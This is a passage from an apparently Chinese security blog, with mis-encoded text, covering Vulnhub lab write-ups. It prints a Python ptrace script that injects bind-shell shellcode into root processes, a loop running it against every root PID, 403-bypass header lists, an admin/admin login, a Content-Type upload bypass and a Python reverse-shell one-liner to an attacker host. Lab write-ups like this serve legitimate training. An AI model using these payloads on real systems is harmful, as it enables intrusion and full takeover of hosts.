<p>ä¸‹è½½åˆ©ç”¨è„šæœ¬ï¼Œä¸è¿‡é“¾æ¥å¤±æ•ˆäº†ã€‚ä¸‹é¢æ˜¯è„šæœ¬çš„æºç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers = user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">4</span>):</span><br><span class="line">    <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">    shellcode_byte_int = <span class="built_in">int</span>(shellcode[i:<span class="number">4</span> + i].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    shellcode_byte_little_endian = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    shellcode_byte = <span class="built_in">int</span>(shellcode_byte_little_endian, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject the byte.</span></span><br><span class="line">    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip = registers.rip + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 inject.py processID <span class="comment"># å°†åé—¨è¿›ç¨‹æ³¨å…¥åˆ°å¯¹åº”IDçš„è¿›ç¨‹</span></span><br></pre></td></tr></table></figure>
<p>ï¼ˆæ³¨æ„ï¼Œä¸€å®šè¦æ³¨å…¥åˆ°rootç”¨æˆ·çš„è¿›ç¨‹ï¼‰</p>
<p>rootçš„è¿›ç¨‹å¾ˆå¤šï¼Œæ‰€ä»¥å†™ä¸€ä¸ªç®€å•çš„è„šæœ¬è¿›è¡Œæ‰¹é‡åŒ–å°è¯•ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `ps -ef|grep root|grep -v <span class="string">&quot;grep&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="keyword">do</span> python2.7 inject.py <span class="variable">$pid</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®€å•è¯´æ˜ï¼šps -efæŸ¥çœ‹è¿›ç¨‹æƒ…å†µï¼Œä¸€ä¸ªè¿›ç¨‹ä¸€è¡Œï¼Œgrep rootåªåˆ—å‡ºå¸¦æœ‰rootçš„è¡Œï¼ˆè¿›ç¨‹ï¼‰ï¼Œgrep -v &quot;grep&quot;ä¸æ˜¾ç¤ºå¸¦æœ‰grepçš„è¡Œï¼ˆè¿›ç¨‹ï¼‰ï¼Œawk &#x27;&#123;print $2&#125;&#x27;æ˜¾ç¤ºæ¯ä¸€è¡Œçš„ç¬¬äºŒä¸ªä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰å³PIDã€‚</span></span><br></pre></td></tr></table></figure></p>
<p>è¯¥åé—¨åˆ©ç”¨çš„æ˜¯5600ç«¯å£ï¼Œå¦‚æœæ‰§è¡Œå®Œæ¯•ä¹‹åè¯¥ç«¯å£å¼€å¯ï¼Œè¯´æ˜æ³¨å…¥æˆåŠŸ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tunpla |grep 5600</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408114925.png" /></p>
<p>ç„¶ååˆ©ç”¨ncè¿æ¥å³å¯ææƒåˆ°rootã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 0.0.0.0 5600</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408115600.png" /></p>
<p>æˆåŠŸææƒï¼Œè¯¥é¶æœºåˆ°æ­¤ç»“æŸã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>é€šè¿‡å¯¹è¯¥é¶æœºçš„æ¸—é€å­¦åˆ°äº†ï¼š</p>
<ul>
<li>DNSåŸŸä¼ é€æ¼æ´çš„åˆ©ç”¨ä»¥åŠDNSçš„ç›¸å…³çŸ¥è¯†</li>
<li>XXEæ¼æ´å³XMLç›¸å…³çŸ¥è¯†</li>
<li>SSTIæ¼æ´çš„get shellæ–¹å¼</li>
<li>CapabilitiesæŠ€æœ¯çš„ææƒ</li>
</ul>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>DNSåŸŸä¼ é€æ¼æ´</tag>
        <tag>Capabilitiesææƒ</tag>
        <tag>SSTI get shell</tag>
        <tag>XXEæ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>8 Vulnhub Y0usef1 Writeup</title>
    <url>/2022/04/09/8%20Vulnhub%20Y0usef1%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºç®€å•ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
<p>éš¾åº¦ï¼šEasyï¼ˆéš¾åº¦ä½è¯´æ˜æ—¥å¸¸ä¸­æœ€å¸¸è§çš„æ¼æ´ï¼‰</p>
<p>ç›®æ ‡ï¼šå–å¾—rootæƒé™ + 2Flag</p>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>Webä¿¡æ¯æ”¶é›†</li>
<li>å¼±å£ä»¤</li>
<li><strong>æŒ‡çº¹æ¢æµ‹</strong></li>
<li><strong>403 Bypass</strong></li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>ææƒ</li>
</ul>
<h1 id="linux-sudoå‘½ä»¤">Linux sudoå‘½ä»¤</h1>
<p>Linux sudoå‘½ä»¤ä»¥ç³»ç»Ÿç®¡ç†è€…çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»ç”± sudo æ‰€æ‰§è¡Œçš„æŒ‡ä»¤å°±å¥½åƒæ˜¯ root äº²è‡ªæ‰§è¡Œã€‚</p>
<p>ä½¿ç”¨æƒé™ï¼šåœ¨ /etc/sudoers ä¸­æœ‰å‡ºç°çš„ä½¿ç”¨è€…ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo -V # æ˜¾ç¤ºç‰ˆæœ¬ç¼–å·</span><br><span class="line">2. sudo -h # æ˜¾ç¤ºç‰ˆæœ¬ç¼–å·åŠæŒ‡ä»¤çš„ä½¿ç”¨æ–¹å¼è¯´æ˜ help</span><br><span class="line">3. sudo -l # æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ sudo çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™</span><br><span class="line">4. sudo -v # å› ä¸º sudo åœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œæ—¶æˆ–æ˜¯åœ¨ N åˆ†é’Ÿå†…æ²¡æœ‰æ‰§è¡Œï¼ˆN é¢„è®¾ä¸ºäº”ï¼‰ä¼šé—®å¯†ç ï¼Œè¿™ä¸ªå‚æ•°æ˜¯é‡æ–°åšä¸€æ¬¡ç¡®è®¤ï¼Œå¦‚æœè¶…è¿‡ N åˆ†é’Ÿï¼Œä¹Ÿä¼šé—®å¯†ç </span><br><span class="line">5. sudo -k # å°†ä¼šå¼ºè¿«ä½¿ç”¨è€…åœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œ sudo æ—¶é—®å¯†ç ï¼ˆä¸è®ºæœ‰æ²¡æœ‰è¶…è¿‡ N åˆ†é’Ÿï¼‰</span><br><span class="line">6. sudo -s # æ‰§è¡Œç¯å¢ƒå˜é‡ä¸­çš„ SHELL æ‰€æŒ‡å®šçš„ shell ï¼Œæˆ–æ˜¯ /etc/passwd é‡Œæ‰€æŒ‡å®šçš„ shell</span><br><span class="line">7. sudo -H # å°†ç¯å¢ƒå˜é‡ä¸­çš„ HOME ï¼ˆå®¶ç›®å½•ï¼‰æŒ‡å®šä¸ºè¦å˜æ›´èº«ä»½çš„ä½¿ç”¨è€…å®¶ç›®å½•ï¼ˆå¦‚ä¸åŠ  -u å‚æ•°å°±æ˜¯ç³»ç»Ÿç®¡ç†è€… root ï¼‰</span><br><span class="line">8. sudo command # è¦ä»¥ç³»ç»Ÿç®¡ç†è€…èº«ä»½ï¼ˆæˆ–ä»¥ -u æ›´æ”¹ä¸ºå…¶ä»–äººï¼‰æ‰§è¡Œçš„æŒ‡ä»¤</span><br><span class="line">9. sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s</span><br><span class="line">	-b å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤</span><br><span class="line">	-p prompt å¯ä»¥æ›´æ”¹é—®å¯†ç çš„æç¤ºè¯­ï¼Œå…¶ä¸­ %u ä¼šä»£æ¢ä¸ºä½¿ç”¨è€…çš„å¸å·åç§°ï¼Œ %h ä¼šæ˜¾ç¤ºä¸»æœºåç§°</span><br><span class="line">	-u username/#uid ä¸åŠ æ­¤å‚æ•°ï¼Œä»£è¡¨è¦ä»¥ root çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œè€ŒåŠ äº†æ­¤å‚æ•°ï¼Œå¯ä»¥ä»¥ username çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼ˆ#uid ä¸ºè¯¥ username çš„ä½¿ç”¨è€…idï¼‰</span><br></pre></td></tr></table></figure>
<h1 id="bypass">403&amp;401 Bypass</h1>
<p>å¸¸è§403 Bypassï¼š</p>
<ol type="1">
<li>æ—ç«™ç»•è¿‡ï¼šä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„hostï¼ˆå¯ä»¥æ˜¯åŸŸåï¼Œä¹Ÿå¯ä»¥æ˜¯IPåœ°å€ï¼‰ã€‚å‡è®¾ç›®æ ‡ç½‘ç«™çš„åŸŸåä¸º<code>www.target.com</code>ï¼Œæˆ‘ä»¬é€šè¿‡ä¿¡æ¯æ”¶é›†å‘ç°å­˜åœ¨å¦ä¸€ä¸ªå­åŸŸå<code>special.target.com</code>ï¼Œæˆ‘ä»¬ä»<code>www</code>è®¿é—®æŸä¸ªæ–‡ä»¶å¯èƒ½å‡ºç°403ï¼Œä½†æ˜¯ä»<code>special</code>è®¿é—®å¯èƒ½å°±èƒ½å¤ŸæˆåŠŸã€‚è¿™æ˜¯å› ä¸ºç®¡ç†å‘˜<strong>åªé’ˆå¯¹<code>www.target.com</code>çš„è¯·æ±‚åšäº†é™åˆ¶</strong>ã€‚</li>
<li>è¦†ç›–URL</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå…ˆçš„æ•°æ®åŒ…ï¼š</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">è¦†ç›–URLçš„æ•°æ®åŒ…ï¼š</span><br><span class="line"># Reques</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<p>åŸç†ï¼šç®¡ç†å‘˜<strong>åªé’ˆå¯¹è¯·æ±‚çš„URLåšäº†é™åˆ¶</strong>ï¼Œå³å¦‚æœç›´æ¥è®¿é—®<code>/auth/login</code>åˆ™ä¼š403ï¼Œä½†æ˜¯ï¼Œå¦‚æœè®¿é—®æ ¹ç›®å½•ï¼Œç„¶åé€šè¿‡X-Original-URL æˆ– X-Rewrite-URL HTTP è¯·æ±‚æ ‡å¤´è¦†ç›–è¯·æ±‚ URL ä¸­çš„è·¯å¾„ï¼ˆå‰ææ˜¯æœåŠ¡å™¨æ”¯æŒè¿™ä¸¤ç§æ ‡å¤´ï¼‰</p>
<ol start="3" type="1">
<li>ä¿®æ”¹æ¥æº</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå…ˆçš„æ•°æ®åŒ…ï¼š</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹æ¥æºçš„æ•°æ®åŒ…ï¼š</span><br><span class="line"># Reques</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line">  Referer: https://xxx.com</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<p>åŸç†ï¼šç®¡ç†å‘˜<strong>åªé’ˆå¯¹ä»å…¶ä»–åŸŸå/ç½‘ç«™æ¥çš„è¯·æ±‚åšäº†é™åˆ¶</strong>ï¼Œå› æ­¤ï¼Œé€šè¿‡ä¿®æ”¹<code>Referer</code>å°†è¯·æ±‚çš„æ¥æºä¼ªè£…æˆå·²ç»æˆæƒçš„URLåœ°å€ã€‚æ­¤æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè®¤ä¸ºè¯¥ç”¨æˆ·å·²ç»å¾—åˆ°äº†æˆæƒï¼Œæ‰€ä»¥å…è®¸è®¿é—®å…¶ä»–éœ€è¦æˆæƒçš„URL</p>
<ol start="4" type="1">
<li>åå‘ä»£ç†ï¼šä½¿ç”¨è®¸å¤š<code>X</code>å¼€å¤´çš„å¤´éƒ¨ï¼Œæ¯”å¦‚<code>X-Forwarded-For</code>ã€‚</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
<h1 id="æ¸—é€">æ¸—é€</h1>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.11</span><br><span class="line">sudo nmap -p20,80 -sV 10.0.2.11</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
<ul>
<li>22ç«¯å£å¼€å¯sshæœåŠ¡</li>
<li>80ç«¯å£å¼€ç€httpæœåŠ¡ï¼ŒApacheç‰ˆæœ¬2.4.10</li>
<li>é¶æœºçš„æ“ä½œç³»ç»Ÿä¸ºUbuntu</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®HTTPæœåŠ¡</h2>
<p>è®¿é—®80ç«¯å£ï¼Œå¾—åˆ°æç¤ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, the site is under construction soon, it run</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹æºç å‘ç°æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œé‚£å°±è¿›è¡Œè·¯å¾„å‘ç°ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.11:80</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
<p>å…ˆè®¿é—®äº†çŠ¶æ€ç ä¸º200çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œå‘ç°æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œå†å»çœ‹äº†ä¸€ä¸‹301çš„æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
<p>å‘ç°å±…ç„¶è¿”å›403ã€‚403è¡¨ç¤ºæœåŠ¡å™¨æœ‰è¿™ä¸ªèµ„æºï¼Œä½†æ˜¯å¯¹è®¿é—®è¯¥èµ„æºçš„ç”¨æˆ·åšäº†ä¸€å®šçš„é™åˆ¶ï¼Œåªæœ‰ç»è¿‡æˆæƒçš„ç”¨æˆ·æ‰èƒ½å¤Ÿè®¿é—®ï¼Œå¦åˆ™å°±ä¼šè¿”å›403ã€‚å› æ­¤ï¼Œè¿™é‡Œæƒ³åˆ°403 Bypassã€‚</p>
<h2 id="æŒ‡çº¹æ¢æµ‹">æŒ‡çº¹æ¢æµ‹</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb http://10.0.2.11</span><br></pre></td></tr></table></figure>
<p>åƒä¸Šé¢æ”¶é›†ä¸åˆ°ä»»ä½•ä¿¡æ¯çš„æ—¶å€™ï¼Œå¯ä»¥é‡‡ç”¨æŒ‡çº¹æ¢æµ‹ï¼Œçœ‹ä¸€ä¸‹ç½‘ç«™çš„ç»“æ„ï¼ˆç”¨çš„ä»€ä¹ˆæ¡†æ¶ï¼Œç‰ˆæœ¬å¤šå°‘ï¼Œè¯­è¨€æ˜¯ä»€ä¹ˆä¹‹ç±»çš„ä¿¡æ¯ï¼‰ï¼Œå¦‚æœå¯¹åº”çš„æ¡†æ¶å­˜åœ¨æ¼æ´ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
<h2 id="bypass-1">403 Bypass</h2>
<p>ç»è¿‡å°è¯•ï¼Œå‘ç°åœ¨è¯·æ±‚å¤´éƒ¨æ·»åŠ ä¸‹é¢ä¿¡æ¯æ—¶ï¼ŒæˆåŠŸè®¿é—® <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
<p>æ³¨æ„ï¼Œå¦‚æœåé¢æ¸—é€è¿‡ç¨‹ä¸­å†æ¬¡å‡ºç°403ï¼Œé‚£ä¹ˆå°±åœ¨è¯·æ±‚æ•°æ®åŒ…ä¸­åŠ å…¥ä¸Šè¿°ä¿¡æ¯å³å¯ï¼Œä¹Ÿå¯ä»¥æ¯ä¸ªéƒ½åŠ ï¼ˆåæ­£æ²¡å®³ï¼‰ã€‚</p>
<h2 id="å¼±å£ä»¤">å¼±å£ä»¤</h2>
<p>æ‹¿åˆ°è¾“å…¥æ¡†ä¸€èˆ¬æœ‰ä»¥ä¸‹æ€è·¯ï¼š</p>
<ol type="1">
<li>å¼±å£ä»¤</li>
<li>æ³¨å…¥æ¼æ´</li>
<li>XXEã€XXS</li>
<li>çˆ†ç ´</li>
</ol>
<p>è¿™é‡Œéšä¾¿å°è¯•äº†ä¸‹å¼±å£ä»¤ï¼Œå±…ç„¶ç™»å½•æˆåŠŸï¼ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
<h2 id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </h2>
<p>ä¸€è¿›æ¥å°±çœ‹åˆ°äº†<code>Upload file</code></p>
<p>ç›´æ¥ä¸Šä¼ ä¸€ä¸ªåé—¨phpæ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ ä¸æˆåŠŸï¼Œä¹Ÿå°±æ˜¯è¢«æ‹¦æˆªäº†ã€‚ç°åœ¨éœ€è¦ç»•è¿‡æ‹¦æˆªï¼Œå¸¸è§„æœ‰ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<ol type="1">
<li>ä¿®æ”¹åç¼€ï¼ˆå¤§å°å†™ã€å¤å†™ï¼‰</li>
<li>ä¿®æ”¹<code>Content-Type</code></li>
<li>ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li>
</ol>
<p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°æœ¬é¢˜åå°çš„éªŒè¯æ–¹å¼æ˜¯<code>Content-Type</code>ï¼Œå› æ­¤å°†è¯¥ä¿¡æ¯ä¿®æ”¹ä¸ºå›¾ç‰‡çš„å³å¯ä¸Šä¼ æˆåŠŸï¼Œå¹¶ä¸”æˆåŠŸè·å¾—è·¯å¾„ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
<p>å‘½ä»¤æˆåŠŸè¢«æ‰§è¡Œï¼Œç¡®å®šæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åå¼¹shelläº†ã€‚è¿™é‡Œå¯ä»¥é‡‡ç”¨ncï¼Œä¹Ÿå¯ä»¥ç”¨pythonï¼Œæˆ‘è¿™é‡Œæ‰“ç®—ç”¨pythonï¼Œæ‰€ä»¥å…ˆç”¨<code>which python</code>æŸ¥çœ‹ä»¥ä¸‹é¶æœºä¸Šæ˜¯å¦å­˜åœ¨pythonç¯å¢ƒï¼Œå‘ç°ç¡®å®å­˜åœ¨ï¼Œé‚£ä¹ˆç›´æ¥æ‰§è¡Œpythonåå¼¹shellçš„ä»£ç å³å¯ã€‚ï¼ˆå…ˆåœ¨kaliä¸Šè¿›è¡Œç«¯å£ç›‘å¬ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
<h2 id="æƒé™æå‡">æƒé™æå‡</h2>
